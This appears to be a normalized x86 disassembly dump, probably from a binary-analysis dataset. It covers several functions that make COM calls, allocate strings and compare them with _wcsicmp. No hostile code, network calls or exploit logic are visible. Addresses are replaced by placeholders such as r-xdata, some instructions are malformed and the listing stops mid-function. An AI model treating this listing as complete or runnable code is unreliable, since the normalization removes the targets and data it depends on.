mov [ ebp - 0x4 ] 0x7
mov eax [ esi ]
mov edx [ eax + 0x94 ]
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push esi
call edx
mov [ ebp - 0x4 ] 0x6
push edi
call [ SysFreeString@IAT ]
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push 0x8007000e
call sub_402d00
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x4 ] 0xc
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0x18 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov ecx [ ebp - 0x18 ]
test ecx ecx
jne r-xdata
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push edx
mov edx [ ebp - 0x10 ]
push eax
push edx
mov edx [ ebp + 0x10 ]
call sub_423c50
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x14 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
push esi
call ecx
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_423c50
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44bcfe
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor edi edi
mov [ esp + 0x18 ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0xc ] edi
mov [ esp + 0x30 ] 0x1
mov ecx [ eax ]
lea edx [ esp + 0xc ]
push edx
push r--data
push eax
mov eax [ ecx + 0x94 ]
call eax
cmp [ esp + 0xc ] edi
jne r-xdata
mov eax [ ebx + 0x84 ]
mov cl [ eax ]
mov [ esi + 0x184 ] cl
mov edx [ ebx + 0x84 ]
mov al [ edx + 0x3 ]
mov [ esi + 0x195 ] al
mov [ esp + 0x10 ] edi
mov [ esp + 0x30 ] 0x4
mov eax [ esp + 0xc ]
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
cmp [ esp + 0x10 ] edi
je r-xdata
mov [ esp + 0x30 ] 0xffffffff
mov eax [ esp + 0xc ]
cmp eax edi
jmp r-xdata
mov edi [ esp + 0x20 ]
mov ecx [ ebp + 0xc ]
mov edx [ esp + 0xc ]
push edi
push ecx
push ebx
mov ecx esi
mov [ esi + 0x70 ] 0xffffffff
call sub_43c5d0
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x30 ] 0x9
mov eax [ esp + 0xc ]
mov edx [ eax ]
mov edx [ edx + 0x94 ]
lea ecx [ esp + 0x14 ]
push ecx
push r--data
push eax
call edx
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x1c ] eax
mov [ esp + 0x30 ] 0x6
mov ecx [ esp + 0x10 ]
push r--data
push ecx
lea edi [ esp + 0x24 ]
call sub_428960
mov edi [ esp + 0x1c ]
test eax eax
js r-xdata
je r-xdata
add esi 0xc
call sub_4028b0
mov eax [ esp + 0x18 ]
push r--data
push eax
mov edi esi
call sub_428960
test eax eax
jns r-xdata
mov ecx [ ebx + 0x84 ]
mov dl [ ecx + 0x2 ]
push esi
mov [ esi + 0x194 ] dl
push eax
mov ecx edi
mov edx ebx
call sub_43c710
mov [ esp + 0x30 ] 0x4
lea eax [ edi - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
push r--data
push edi
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x30 ] 0x4
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
push r--data
push ecx
call sub_428960
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push r--data
push edi
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov [ esi + 0xaa ] al
jmp r-xdata
mov [ esp + 0x30 ] 0x1
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov [ esi + 0xaa ] 0x1
mov [ esp + 0x30 ] 0xffffffff
mov eax [ esp + 0xc ]
test eax eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_423e80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b638
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x18 ]
mov edx [ ebp + 0xc ]
lea eax [ edi + 0xc4 ]
push eax
push edx
lea esi [ edi + 0xe4 ]
lea ebx [ edi + 0xd4 ]
push ecx
call sub_429700
mov esi [ ebp + 0x10 ]
push 0x0
push r--data
push r--data
push esi
call sub_428790
push 0x0
push r--data
push r--data
push esi
mov [ edi + 0xf4 ] al
call sub_428790
test al al
sete al
cmp [ edi + 0xf4 ] 0x0
mov [ edi + 0xf6 ] al
jne r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x10 ] eax
mov [ esp + 0x20 ] 0x1
push r--data
push esi
lea edi [ esp + 0x18 ]
call sub_428960
mov esi [ esp + 0x10 ]
push r--data
push esi
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
je r-xdata
push 0x0
push r--data
push r--data
push esi
call sub_428790
mov [ edi + 0xf5 ] al
mov ecx [ ebp + 0x18 ]
mov [ ecx + 0xc0 ] eax
mov [ esp + 0x20 ] 0xffffffff
lea eax [ esi - 0x10 ]
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
call sub_43b5c0
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_423fd0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push eax
push 0x1
push ecx
mov ecx r--data
call sub_43cba0
pop ebx
pop ecx
pop ebp
retn 0x18
sub_424000
push ebp
mov ebp esp
and esp 0xfffffff8
mov edx [ ebp + 0x1c ]
mov eax [ ecx + 0x88 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x10 ]
push edx
push 0x1
push ecx
mov ecx r--data
mov edx esi
mov [ ebx + 0x5c ] eax
call sub_43cba0
push 0x0
push r--data
push r--data
push esi
call sub_428790
push 0x0
push r--data
push r--data
push esi
mov [ ebx + 0xc0 ] al
call sub_428790
push 0x0
push r--data
push r--data
push esi
mov [ ebx + 0xc2 ] al
call sub_428790
pop esi
mov [ ebx + 0xc1 ] al
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_424080
push ebp
mov ebp esp
and esp 0xfffffff8
mov edx [ ebp + 0x1c ]
mov eax [ ecx + 0x88 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x10 ]
push edx
push 0x1
push ecx
mov ecx r--data
mov edx esi
mov [ ebx + 0x5c ] eax
call sub_43cba0
push 0x0
push r--data
push r--data
push esi
call sub_428790
push r--data
push esi
xor ecx ecx
mov [ ebx + 0xc0 ] al
mov [ ebx + 0xc3 ] 0x1
call sub_4288a0
push r--data
push esi
xor ecx ecx
mov [ ebx + 0xc4 ] eax
call sub_4288a0
pop esi
mov [ ebx + 0xc8 ] eax
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_424100
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44ba04
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x18 ] ecx
mov edx [ ebp + 0x1c ]
mov eax [ ecx + 0x88 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
push edx
push 0x1
push ecx
mov ecx r--data
mov edx esi
mov [ ebx + 0x5c ] eax
call sub_43cba0
push 0x0
push r--data
push r--data
push esi
call sub_428790
push 0x0
push r--data
push r--data
push esi
mov [ ebx + 0xc0 ] al
call sub_428790
push 0x0
push r--data
push r--data
push esi
mov [ ebx + 0xc2 ] al
call sub_428790
mov [ ebx + 0xc1 ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x10 ] eax
mov [ esp + 0x30 ] 0x1
push r--data
push esi
lea edi [ esp + 0x18 ]
call sub_428960
mov eax [ esp + 0x10 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0xc ]
mov ecx [ esp + 0x18 ]
push edx
push ebx
push eax
push ecx
mov ecx [ ebp + 0x8 ]
call sub_43b6a0
mov eax [ ebp + 0x1c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor edi edi
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x2
call eax
mov edi eax
jmp r-xdata
mov [ esp + 0x30 ] 0x3
test edi edi
je r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
push edi
call edx
mov [ esp + 0x20 ] edi
test edi edi
je r-xdata
mov [ esp + 0x30 ] 0x1
test edi edi
je r-xdata
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x30 ] 0x5
mov eax [ esp + 0x10 ]
push eax
call [ SysAllocString@IAT ]
mov [ esp + 0x1c ] eax
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push esi
push edx
mov esi ebx
call sub_43b470
mov [ esp + 0x30 ] 0xffffffff
mov eax [ esp + 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
jmp r-xdata
mov [ esp + 0x30 ] 0x6
mov ecx [ edi ]
lea edx [ esp + 0x14 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
push edi
call eax
mov [ esp + 0x30 ] 0x5
mov ecx [ esp + 0x1c ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
push 0x8007000e
call sub_402d00
mov [ esp + 0x30 ] 0x3
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x1c ]
mov ecx [ ebp + 0x8 ]
push edx
push ebx
push eax
mov eax [ esp + 0x24 ]
push eax
call sub_43b6a0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_424300
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
mov ebx [ ebp + 0x18 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push r--data
mov esi ecx
mov eax [ esi + 0x88 ]
push r--data
push edi
mov [ ebx + 0x5c ] eax
call sub_428790
push 0x0
push r--data
push r--data
push edi
mov [ ebx + 0xc0 ] al
call sub_428790
mov ecx [ ebp + 0x1c ]
push ecx
push 0x1
push esi
mov ecx r--data
mov edx edi
mov [ ebx + 0xc1 ] al
call sub_43cba0
mov edx [ ebp + 0x1c ]
push edx
push 0x2
push esi
mov ecx r--data
mov edx edi
call sub_43cba0
mov eax [ ebp + 0x1c ]
push eax
push 0x3
push esi
mov ecx r--data
mov edx edi
call sub_43cba0
mov ecx [ ebp + 0x1c ]
push ecx
push 0x4
push esi
mov ecx r--data
mov edx edi
call sub_43cba0
mov edx [ ebp + 0x1c ]
push edx
push 0x5
push esi
mov ecx r--data
mov edx edi
call sub_43cba0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_4243c0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44a660
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x18 ]
mov [ esi + 0x9c ] 0x0
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x14 ] eax
mov [ esp + 0x28 ] 0x1
mov ebx [ ebp + 0x10 ]
push r--data
push ebx
lea edi [ esp + 0x1c ]
call sub_428960
test eax eax
js r-xdata
mov [ esi + 0xa8 ] 0x0
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] 0x3
push r--data
push ebx
lea edi [ esp + 0x20 ]
call sub_428960
mov edi [ esp + 0x18 ]
test eax eax
js r-xdata
mov edi [ esp + 0x14 ]
push r--data
push edi
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x28 ] 0x1
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
push r--data
push edi
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
setne al
mov [ esi + 0xa8 ] al
push r--data
push edi
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov [ esi + 0x9c ] 0x1
jmp r-xdata
mov [ esp + 0x28 ] 0xffffffff
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ esi + 0x9c ] 0x2
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_424520
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b5f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x18 ] ecx
mov edi [ ebp + 0x18 ]
mov eax [ ecx + 0x88 ]
lea edx [ edi + 0xc4 ]
mov [ edi + 0x5c ] eax
mov eax [ ebp + 0xc ]
push edx
push eax
lea esi [ edi + 0xe4 ]
lea ebx [ edi + 0xd4 ]
push ecx
call sub_429700
movzx ecx [ edi + 0xaa ]
mov edx [ ebp + 0x1c ]
mov eax [ esp + 0x18 ]
mov esi [ ebp + 0x10 ]
push edx
push 0x1
mov [ esp + 0x1b ] cl
push eax
mov ebx edi
mov ecx r--data
mov edx esi
mov [ edi + 0xaa ] 0x0
call sub_43cba0
movzx ecx [ esp + 0x13 ]
push 0x0
push r--data
push r--data
push esi
mov [ edi + 0xaa ] cl
call sub_428790
push 0x1
push r--data
test al al
push r--data
sete dl
push esi
mov [ edi + 0xf9 ] dl
call sub_428790
push 0x0
push r--data
push r--data
push esi
mov [ edi + 0xfa ] al
call sub_428790
test al al
sete al
push r--data
mov [ edi + 0xf8 ] al
add edi 0x100
push esi
call sub_428960
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x14 ] eax
mov [ esp + 0x28 ] 0x1
push r--data
push esi
lea edi [ esp + 0x1c ]
mov [ ebx + 0xfc ] 0x0
call sub_428960
mov esi [ esp + 0x14 ]
push r--data
push esi
call [ _wcsicmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x28 ] 0xffffffff
lea eax [ esi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebx + 0xfc ] 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_4246b0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
mov esi ecx
mov ecx [ ebp + 0x14 ]
push ecx
push edi
push edx
push eax
mov ecx esi
call sub_424520
mov ecx [ ebp + 0x1c ]
push ecx
push 0x2
push esi
mov ecx r--data
mov edx edi
call sub_43cba0
mov edx [ ebp + 0x1c ]
push edx
push 0x3
push esi
mov ecx r--data
mov edx edi
call sub_43cba0
push 0x0
push r--data
push r--data
push edi
call sub_428790
test al al
pop edi
sete al
pop esi
mov [ ebx + 0x104 ] al
pop ebx
pop ecx
pop ebp
retn 0x18
sub_424730
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b5b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x18 ] ecx
mov edi [ ebp + 0x18 ]
mov edx [ ebp + 0xc ]
lea eax [ edi + 0xc4 ]
push eax
push edx
lea esi [ edi + 0xe4 ]
lea ebx [ edi + 0xd4 ]
push ecx
call sub_429700
mov eax [ ebp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov esi [ ebp + 0x10 ]
push eax
push 0x1
push ecx
mov ebx edi
mov ecx r--data
mov edx esi
call sub_43cba0
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x14 ] eax
mov [ esp + 0x38 ] 0x1
push r--data
push esi
lea edi [ esp + 0x1c ]
call sub_428960
test eax eax
js r-xdata
mov ebx [ ebp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
push ecx
push edx
lea ecx [ esp + 0x24 ]
call sub_428d70
mov ecx [ eax ]
mov [ ebx + 0xf8 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebx + 0xfc ] edx
mov ecx [ eax + 0x8 ]
mov [ ebx + 0x100 ] ecx
mov edx [ eax + 0xc ]
mov [ ebx + 0x104 ] edx
jmp r-xdata
mov eax [ ebx + 0xf8 ]
mov ecx [ ebx + 0xfc ]
mov edx [ ebx + 0x100 ]
mov [ ebx + 0x114 ] eax
mov eax [ ebx + 0x104 ]
mov [ ebx + 0x118 ] ecx
mov [ ebx + 0x11c ] edx
mov [ ebx + 0x120 ] eax
mov eax [ esp + 0x18 ]
push edi
push eax
lea ecx [ esp + 0x24 ]
call sub_428d70
mov ecx [ eax ]
mov [ ebx + 0x114 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x118 ] edx
mov ecx [ eax + 0x8 ]
mov [ ebx + 0x11c ] ecx
mov edx [ eax + 0xc ]
mov [ ebx + 0x120 ] edx
jmp r-xdata
push r--data
push esi
lea edi [ esp + 0x1c ]
call sub_428960
mov edi [ esp + 0x14 ]
test eax eax
js r-xdata
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push r--data
push esi
xor ecx ecx
call sub_4288a0
push r--data
push esi
xor ecx ecx
mov [ ebx + 0x108 ] eax
call sub_4288a0
mov ecx [ ebx + 0x110 ]
push r--data
push esi
mov [ ebx + 0x10c ] eax
call sub_4288a0
push r--data
push esi
mov ecx 0x1
mov [ ebx + 0x110 ] eax
call sub_4288a0
mov [ ebx + 0x124 ] eax
mov [ esp + 0x38 ] 0xffffffff
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
sub_424910
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44ae6e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov [ esp + 0x20 ] ecx
mov esi [ ebp + 0x14 ]
mov edi esi
call sub_432000
xor edi edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x38 ] 0x1
mov [ esp + 0x14 ] edi
mov [ esp + 0x38 ] 0x3
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
lea edx [ esp + 0x10 ]
push edx
push r--data
push eax
mov eax [ ecx + 0x94 ]
call eax
cmp [ esp + 0x10 ] edi
je r-xdata
mov [ esp + 0x38 ] 0x1
mov eax [ esp + 0x14 ]
cmp eax edi
je r-xdata
mov [ esp + 0x18 ] edi
mov [ esp + 0x38 ] 0x5
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
lea edx [ esp + 0x18 ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
mov ebx [ esp + 0x18 ]
cmp ebx edi
je r-xdata
mov [ esp + 0x38 ] 0xffffffff
mov eax [ esp + 0x10 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
lea edx [ esp + 0x14 ]
push edx
push eax
mov eax [ ecx + 0x40 ]
call eax
mov ecx [ esp + 0x10 ]
mov eax ecx
cmp ecx edi
je r-xdata
call sub_4286c0
mov [ esp + 0x28 ] eax
cmp eax edi
je r-xdata
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esp + 0x14 ]
cmp ecx eax
je r-xdata
mov [ esp + 0x10 ] edi
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ esp + 0x10 ]
mov [ esp + 0x38 ] 0x3
mov eax [ esp + 0x18 ]
cmp eax edi
je r-xdata
mov edx [ ebp + 0x18 ]
mov ecx [ ebp + 0x1c ]
movzx eax [ edx + 0xaa ]
push ecx
mov ecx [ esp + 0x24 ]
push eax
push ecx
mov ecx [ esp + 0x24 ]
call sub_43cd40
mov edx [ rw-data ]
mov ebx eax
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0x1c ] eax
mov [ esp + 0x38 ] 0xa
mov ecx [ esp + 0x18 ]
push r--data
push ecx
lea edi [ esp + 0x24 ]
call sub_428960
mov edx [ esi + 0x270 ]
sub edx [ esi + 0x26c ]
mov eax [ ebp + 0x18 ]
mov edi [ esp + 0x1c ]
sar edx 0x2
inc edx
cmp [ eax + 0x124 ] edx
mov eax [ esp + 0x28 ]
sete cl
mov [ esp + 0x24 ] cl
mov edx [ esp + 0x24 ]
push edx
push ebx
push eax
push edi
push esi
call sub_431e80
mov [ esp + 0x38 ] 0x5
lea eax [ edi - 0x10 ]
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
cmp eax edi
je r-xdata
mov ebx eax
cmp eax edi
je r-xdata
mov [ esp + 0x38 ] 0x1
mov eax [ esp + 0x14 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor edi edi
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ esp + 0x38 ] 0x3
mov eax [ esp + 0x18 ]
cmp eax edi
je r-xdata
mov [ esp + 0x14 ] edi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
cmp ecx edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ esp + 0x10 ] edi
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esp + 0x10 ] ebx
mov eax [ ecx ]
push ecx
mov ecx [ eax + 0x8 ]
call ecx
mov eax [ esp + 0x14 ]
sub_424b60
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
push edi
mov edi [ ebp + 0x1c ]
push edi
mov esi ecx
push 0x2
push esi
mov ecx r--data
call sub_43cba0
mov edx [ ebp + 0x10 ]
push edi
push 0x3
push esi
mov ecx r--data
call sub_43cba0
mov edx [ ebp + 0x10 ]
push edi
push 0x4
push esi
mov ecx r--data
call sub_43cba0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x18
sub_424bb0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b994
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x18 ] esi
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x10 ] eax
mov [ esp + 0x30 ] 0x1
mov eax [ ebp + 0x10 ]
push r--data
push eax
lea edi [ esp + 0x18 ]
call sub_428960
mov ecx [ esp + 0x10 ]
mov eax [ ecx - 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0xc ]
push edx
push eax
push ecx
mov ecx [ ebp + 0x8 ]
push esi
call sub_43b6a0
mov eax [ ebp + 0x1c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x18
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
xor edi edi
mov ecx [ eax + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x2
call eax
mov edi eax
jmp r-xdata
mov [ esp + 0x30 ] 0x3
test edi edi
je r-xdata
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
push edi
call edx
mov [ esp + 0x1c ] edi
test edi edi
je r-xdata
mov [ esp + 0x30 ] 0x1
test edi edi
je r-xdata
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x30 ] 0x5
mov eax [ esp + 0x10 ]
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov [ esp + 0x20 ] esi
test esi esi
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ esp + 0x18 ]
mov esi [ ebp + 0x18 ]
push edx
push eax
call sub_43b470
mov [ esp + 0x30 ] 0xffffffff
mov eax [ esp + 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
jmp r-xdata
mov [ esp + 0x30 ] 0x6
mov ecx [ edi ]
mov eax [ ecx + 0x94 ]
lea edx [ esp + 0x14 ]
push edx
push esi
push edi
